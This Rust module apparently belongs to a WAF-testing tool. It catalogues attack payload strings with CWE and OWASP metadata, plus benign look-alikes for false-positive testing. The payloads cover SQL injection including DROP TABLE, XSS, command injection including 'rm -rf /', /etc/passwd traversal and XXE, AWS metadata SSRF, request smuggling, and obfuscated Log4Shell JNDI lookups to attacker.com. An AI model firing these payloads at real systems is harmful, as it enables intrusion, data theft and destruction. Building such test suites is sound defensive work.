//! Attack Patterns for WAF Testing
//!
//! This module contains categorized attack patterns used for testing WAF effectiveness.
//! Patterns are organized by attack type and include metadata for proper reporting.

use serde::{Deserialize, Serialize};

/// Categories of attack patterns
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PatternCategory {
    SqlInjection,
    CrossSiteScripting,
    CommandInjection,
    PathTraversal,
    XmlExternalEntity,
    ServerSideRequestForgery,
    TemplateInjection,
    HttpParameterPollution,
    HttpRequestSmuggling,
    GraphQLInjection,
    PrototypePollution,
    Log4Shell,
    WebSocketInjection,
    Benign,
}

/// An attack pattern with metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackPattern {
    pub id: String,
    pub name: String,
    pub category: PatternCategory,
    pub pattern: String,
    pub description: String,
    pub risk_level: String,
    pub cwe_id: Option<String>,
    pub owasp_category: Option<String>,
}

/// Get all patterns for a category
pub fn get_patterns_by_category(category: PatternCategory) -> Vec<AttackPattern> {
    match category {
        PatternCategory::SqlInjection => sql_injection_patterns(),
        PatternCategory::CrossSiteScripting => xss_patterns(),
        PatternCategory::CommandInjection => command_injection_patterns(),
        PatternCategory::PathTraversal => path_traversal_patterns(),
        PatternCategory::XmlExternalEntity => xxe_patterns(),
        PatternCategory::ServerSideRequestForgery => ssrf_patterns(),
        PatternCategory::TemplateInjection => template_injection_patterns(),
        PatternCategory::HttpParameterPollution => hpp_patterns(),
        PatternCategory::HttpRequestSmuggling => http_request_smuggling_patterns(),
        PatternCategory::GraphQLInjection => graphql_injection_patterns(),
        PatternCategory::PrototypePollution => prototype_pollution_patterns(),
        PatternCategory::Log4Shell => log4shell_patterns(),
        PatternCategory::WebSocketInjection => websocket_injection_patterns(),
        PatternCategory::Benign => benign_patterns(),
    }
}

/// SQL Injection patterns
fn sql_injection_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "sqli-001".to_string(),
            name: "Basic SQL Injection".to_string(),
            category: PatternCategory::SqlInjection,
            pattern: "' OR '1'='1".to_string(),
            description: "Classic SQL injection attempting to bypass authentication".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-89".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "sqli-002".to_string(),
            name: "Union-based SQL Injection".to_string(),
            category: PatternCategory::SqlInjection,
            pattern: "' UNION SELECT NULL,NULL,NULL--".to_string(),
            description: "Attempts to extract data using UNION clause".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-89".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "sqli-003".to_string(),
            name: "Time-based Blind SQL Injection".to_string(),
            category: PatternCategory::SqlInjection,
            pattern: "'; WAITFOR DELAY '00:00:05'--".to_string(),
            description: "Blind SQL injection using time delays".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-89".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// Cross-Site Scripting patterns
fn xss_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "xss-001".to_string(),
            name: "Basic Script Tag".to_string(),
            category: PatternCategory::CrossSiteScripting,
            pattern: "<script>alert('XSS')</script>".to_string(),
            description: "Simple XSS using script tags".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-79".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "xss-002".to_string(),
            name: "Event Handler XSS".to_string(),
            category: PatternCategory::CrossSiteScripting,
            pattern: "<img src=x onerror=alert('XSS')>".to_string(),
            description: "XSS using event handlers".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-79".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "xss-003".to_string(),
            name: "SVG-based XSS".to_string(),
            category: PatternCategory::CrossSiteScripting,
            pattern: "<svg onload=alert('XSS')>".to_string(),
            description: "XSS using SVG elements".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-79".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// Command Injection patterns
fn command_injection_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "cmdi-001".to_string(),
            name: "Basic Command Injection".to_string(),
            category: PatternCategory::CommandInjection,
            pattern: "; ls -la".to_string(),
            description: "Attempts to execute system commands".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-78".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "cmdi-002".to_string(),
            name: "Pipe Command Injection".to_string(),
            category: PatternCategory::CommandInjection,
            pattern: "| whoami".to_string(),
            description: "Command injection using pipe operator".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-78".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "cmdi-003".to_string(),
            name: "Backtick Command Injection".to_string(),
            category: PatternCategory::CommandInjection,
            pattern: "`id`".to_string(),
            description: "Command injection using backticks".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-78".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// Path Traversal patterns
fn path_traversal_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "path-001".to_string(),
            name: "Basic Path Traversal".to_string(),
            category: PatternCategory::PathTraversal,
            pattern: "../../../etc/passwd".to_string(),
            description: "Attempts to access system files".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-22".to_string()),
            owasp_category: Some("A01:2021".to_string()),
        },
        AttackPattern {
            id: "path-002".to_string(),
            name: "Encoded Path Traversal".to_string(),
            category: PatternCategory::PathTraversal,
            pattern: "..%2F..%2F..%2Fetc%2Fpasswd".to_string(),
            description: "URL encoded path traversal".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-22".to_string()),
            owasp_category: Some("A01:2021".to_string()),
        },
    ]
}

/// XXE patterns
fn xxe_patterns() -> Vec<AttackPattern> {
    vec![AttackPattern {
        id: "xxe-001".to_string(),
        name: "Basic XXE".to_string(),
        category: PatternCategory::XmlExternalEntity,
        pattern: r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#
            .to_string(),
        description: "XML External Entity injection".to_string(),
        risk_level: "HIGH".to_string(),
        cwe_id: Some("CWE-611".to_string()),
        owasp_category: Some("A05:2021".to_string()),
    }]
}

/// SSRF patterns
fn ssrf_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "ssrf-001".to_string(),
            name: "AWS Metadata SSRF".to_string(),
            category: PatternCategory::ServerSideRequestForgery,
            pattern: "http://169.254.169.254/latest/meta-data/".to_string(),
            description: "Attempts to access AWS metadata endpoint".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-918".to_string()),
            owasp_category: Some("A10:2021".to_string()),
        },
        AttackPattern {
            id: "ssrf-002".to_string(),
            name: "Internal Network SSRF".to_string(),
            category: PatternCategory::ServerSideRequestForgery,
            pattern: "http://192.168.1.1/admin".to_string(),
            description: "Attempts to access internal network".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-918".to_string()),
            owasp_category: Some("A10:2021".to_string()),
        },
    ]
}

/// Template Injection patterns
fn template_injection_patterns() -> Vec<AttackPattern> {
    vec![AttackPattern {
        id: "ssti-001".to_string(),
        name: "Basic Template Injection".to_string(),
        category: PatternCategory::TemplateInjection,
        pattern: "{{7*7}}".to_string(),
        description: "Server-side template injection test".to_string(),
        risk_level: "HIGH".to_string(),
        cwe_id: Some("CWE-1336".to_string()),
        owasp_category: Some("A03:2021".to_string()),
    }]
}

/// HTTP Parameter Pollution patterns
fn hpp_patterns() -> Vec<AttackPattern> {
    vec![AttackPattern {
        id: "hpp-001".to_string(),
        name: "Duplicate Parameter".to_string(),
        category: PatternCategory::HttpParameterPollution,
        pattern: "id=1&id=2".to_string(),
        description: "HTTP Parameter Pollution with duplicate parameters".to_string(),
        risk_level: "MEDIUM".to_string(),
        cwe_id: Some("CWE-235".to_string()),
        owasp_category: Some("A03:2021".to_string()),
    }]
}

/// HTTP Request Smuggling patterns
fn http_request_smuggling_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "hrs-001".to_string(),
            name: "CL.TE Request Smuggling".to_string(),
            category: PatternCategory::HttpRequestSmuggling,
            pattern: "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n".to_string(),
            description: "HTTP Request Smuggling using Content-Length and Transfer-Encoding conflict".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-444".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "hrs-002".to_string(),
            name: "TE.CL Request Smuggling".to_string(),
            category: PatternCategory::HttpRequestSmuggling,
            pattern: "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
            description: "HTTP Request Smuggling exploiting TE.CL desync".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-444".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "hrs-003".to_string(),
            name: "Transfer-Encoding Obfuscation".to_string(),
            category: PatternCategory::HttpRequestSmuggling,
            pattern: "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n".to_string(),
            description: "Request smuggling using multiple Transfer-Encoding headers".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-444".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// GraphQL Injection patterns
fn graphql_injection_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "gql-001".to_string(),
            name: "GraphQL Introspection Query".to_string(),
            category: PatternCategory::GraphQLInjection,
            pattern: r#"{"query": "{ __schema { types { name } } }"}"#.to_string(),
            description: "GraphQL introspection to enumerate schema and types".to_string(),
            risk_level: "MEDIUM".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            owasp_category: Some("A01:2021".to_string()),
        },
        AttackPattern {
            id: "gql-002".to_string(),
            name: "GraphQL Batch Query Abuse".to_string(),
            category: PatternCategory::GraphQLInjection,
            pattern: r#"query { user(id: "1") { name } user(id: "2") { name } }"#.to_string(),
            description: "GraphQL batching to extract multiple records in single request"
                .to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-89".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "gql-003".to_string(),
            name: "GraphQL Field Aliasing".to_string(),
            category: PatternCategory::GraphQLInjection,
            pattern:
                r#"query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"#
                    .to_string(),
            description: "GraphQL aliasing to extract sensitive data fields".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            owasp_category: Some("A01:2021".to_string()),
        },
    ]
}

/// Prototype Pollution patterns
fn prototype_pollution_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "pp-001".to_string(),
            name: "JSON Prototype Pollution".to_string(),
            category: PatternCategory::PrototypePollution,
            pattern: r#"{"__proto__": {"admin": true}}"#.to_string(),
            description: "JavaScript prototype pollution via __proto__".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-1321".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "pp-002".to_string(),
            name: "Constructor Prototype Pollution".to_string(),
            category: PatternCategory::PrototypePollution,
            pattern: r#"{"constructor": {"prototype": {"admin": true}}}"#.to_string(),
            description: "Prototype pollution via constructor.prototype".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-1321".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "pp-003".to_string(),
            name: "Query Parameter Prototype Pollution".to_string(),
            category: PatternCategory::PrototypePollution,
            pattern: "?__proto__[admin]=true".to_string(),
            description: "Prototype pollution via URL query parameters".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-1321".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// Log4Shell (Log4j RCE) patterns
fn log4shell_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "l4s-001".to_string(),
            name: "Log4Shell JNDI LDAP".to_string(),
            category: PatternCategory::Log4Shell,
            pattern: "${jndi:ldap://attacker.com/a}".to_string(),
            description: "Log4j RCE via JNDI LDAP lookup".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-917".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "l4s-002".to_string(),
            name: "Log4Shell JNDI RMI".to_string(),
            category: PatternCategory::Log4Shell,
            pattern: "${jndi:rmi://attacker.com/a}".to_string(),
            description: "Log4j RCE via JNDI RMI lookup".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-917".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "l4s-003".to_string(),
            name: "Obfuscated Log4Shell".to_string(),
            category: PatternCategory::Log4Shell,
            pattern: "${${lower:j}ndi:${lower:l}dap://attacker.com/a}".to_string(),
            description: "Obfuscated Log4j RCE using nested lookups and transformations"
                .to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-917".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "l4s-004".to_string(),
            name: "Advanced Log4Shell Evasion".to_string(),
            category: PatternCategory::Log4Shell,
            pattern:
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}"
                    .to_string(),
            description: "Advanced Log4Shell evasion using recursive expansion".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-917".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// WebSocket Injection patterns
fn websocket_injection_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "ws-001".to_string(),
            name: "WebSocket XSS Injection".to_string(),
            category: PatternCategory::WebSocketInjection,
            pattern: r#"{"type":"message","data":"<script>alert('XSS')</script>"}"#.to_string(),
            description: "Cross-site scripting via WebSocket message payload".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-1385".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "ws-002".to_string(),
            name: "WebSocket Command Injection".to_string(),
            category: PatternCategory::WebSocketInjection,
            pattern: r#"{"cmd":"exec","args":"rm -rf /"}"#.to_string(),
            description: "Command injection via WebSocket message".to_string(),
            risk_level: "CRITICAL".to_string(),
            cwe_id: Some("CWE-1385".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
        AttackPattern {
            id: "ws-003".to_string(),
            name: "WebSocket SQL Injection".to_string(),
            category: PatternCategory::WebSocketInjection,
            pattern: r#"{"event":"subscribe","channel":"'; DROP TABLE users; --"}"#.to_string(),
            description: "SQL injection via WebSocket subscription channel".to_string(),
            risk_level: "HIGH".to_string(),
            cwe_id: Some("CWE-1385".to_string()),
            owasp_category: Some("A03:2021".to_string()),
        },
    ]
}

/// Benign but suspicious-looking patterns for false positive testing
fn benign_patterns() -> Vec<AttackPattern> {
    vec![
        AttackPattern {
            id: "benign-001".to_string(),
            name: "Blog post with SQL keywords".to_string(),
            category: PatternCategory::Benign,
            pattern: "Today I learned how to SELECT data FROM a database using WHERE clauses".to_string(),
            description: "Legitimate blog content containing SQL keywords".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-002".to_string(),
            name: "Valid path traversal".to_string(),
            category: PatternCategory::Benign,
            pattern: "/docs/../images/logo.png".to_string(),
            description: "URL path with valid traversal for navigation".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-003".to_string(),
            name: "JSON with angle brackets".to_string(),
            category: PatternCategory::Benign,
            pattern: r#"{"message": "<b>Hello</b> World"}"#.to_string(),
            description: "Legitimate JSON containing HTML formatting tags".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-004".to_string(),
            name: "Search query with boolean keywords".to_string(),
            category: PatternCategory::Benign,
            pattern: "search=red OR blue AND green".to_string(),
            description: "Natural language search with OR/AND keywords".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-005".to_string(),
            name: "HTML tutorial comment".to_string(),
            category: PatternCategory::Benign,
            pattern: "comment=I love the <script> tag in HTML tutorials".to_string(),
            description: "Forum comment about HTML/JavaScript learning".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-006".to_string(),
            name: "Valid percent-encoded name".to_string(),
            category: PatternCategory::Benign,
            pattern: "name=O%27Brien".to_string(),
            description: "Legitimate name with apostrophe correctly encoded".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-007".to_string(),
            name: "Mathematical expression".to_string(),
            category: PatternCategory::Benign,
            pattern: "calc=1+1=2 OR 2+2=4".to_string(),
            description: "Math calculation that looks like SQL injection".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
        AttackPattern {
            id: "benign-008".to_string(),
            name: "Legitimate XML content".to_string(),
            category: PatternCategory::Benign,
            pattern: r#"data=<note><to>User</to><from>Admin</from></note>"#.to_string(),
            description: "Valid XML data without external entities".to_string(),
            risk_level: "NONE".to_string(),
            cwe_id: None,
            owasp_category: None,
        },
    ]
}
